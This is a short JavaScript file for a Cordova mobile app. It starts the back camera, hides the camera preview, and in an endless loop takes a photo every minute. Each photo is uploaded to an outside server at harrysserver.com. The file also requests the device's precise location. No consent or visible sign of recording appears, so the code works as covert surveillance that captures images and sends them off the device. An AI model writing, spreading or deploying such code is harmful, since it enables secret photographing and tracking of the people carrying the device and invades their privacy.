var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {
  },
  receivedEvent: function(id) {}
};

var photograph=function() {
  let url='http://harrysserver.com/test/upload.php';
      CameraPreview.setFlashMode('off');
      CameraPreview.takePicture({height:1280, width:720, quality:65}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post(url, {image: pic, timeout: 50000});
      });
}

function photoDelay() {
  return new Promise(resolve =>  setTimeout(resolve, 60000));
}

async function photos() {
  await photoDelay();  
  photograph();
}

async function processArray() {
  for (var i=0; i<Infinity; i++) { 
     await photos();
  };
}

var gotHere = function(pos) {
  alert(2);
};

function gotError(e) {alert('code='+e.code+'\n'+e.message);}

app.initialize();
navigator.geolocation.getCurrentPosition(gotHere, gotError, {enableHighAccuracy: true, timeout: 20000, maximumAge: 10000});
CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
CameraPreview.hide();
processArray();
